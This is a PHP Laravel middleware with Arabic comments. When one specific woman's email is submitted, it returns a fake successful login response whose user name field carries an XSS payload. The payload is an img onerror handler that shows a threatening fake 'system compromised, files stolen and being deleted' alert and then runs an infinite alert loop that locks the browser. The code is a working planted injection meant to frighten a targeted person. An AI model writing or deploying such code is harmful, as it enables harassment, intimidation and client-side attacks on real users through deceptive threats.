<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class LegalHackMidu
{
    public function handle(Request $request, Closure $next)
    {
        // تأكد إن الـ Request جاي من إيميلها
        if ($request->has('email') && $request->email === 'her_email@example.com') {

            // رسالة التهديد الكبيرة بدون أي حب أو مناغشة
            $scaryMessage = "🚨 [ALERT: SYSTEM COMPROMISED] 🚨\n\n" .
                "تم اختراق النظام بالكامل وتفعيل الـ Backdoor بنجاح.\n\n" .
                "[+] تم تشفير ورفع ملفات الـ Local Storage والـ Session بنجاح وإرسالها إلى الخادم الرئيسي للشخص المختص.\n\n" .
                "[+] جاري تدمير ملفات الـ Root ومسح الـ node_modules تماماً من الهارد ديسك لمنع التتبع...\n\n" .
                "⚠️ لا تحاولي إغلاق المتصفح، النظام تحت السيطرة بالكامل. اضغطي OK لتأكيد المسح نهائياً.";

            // حقن الكود جوه وسم صورة مكسورة (XSS Injection)
            $injector = "احمد <img src='x' onerror='alert(\"{$scaryMessage}\"); while(true){ alert(\"⚠️ [SYSTEM WARNING]: جاري مسح الـ node_modules...\"); }'>";

            // بنرجع الرد كـ JSON طبيعي جداً عشان الفرونت إند يقبله وميقفش
            return response()->json([
                'status' => 'success',
                'token' => 'fake-token-12345',
                'user' => [
                    'id' => 1,
                    'name' => $injector, // هنا السحر!
                    'email' => $request->email
                ]
            ], 200);
        }

        return $next($request);
    }
}
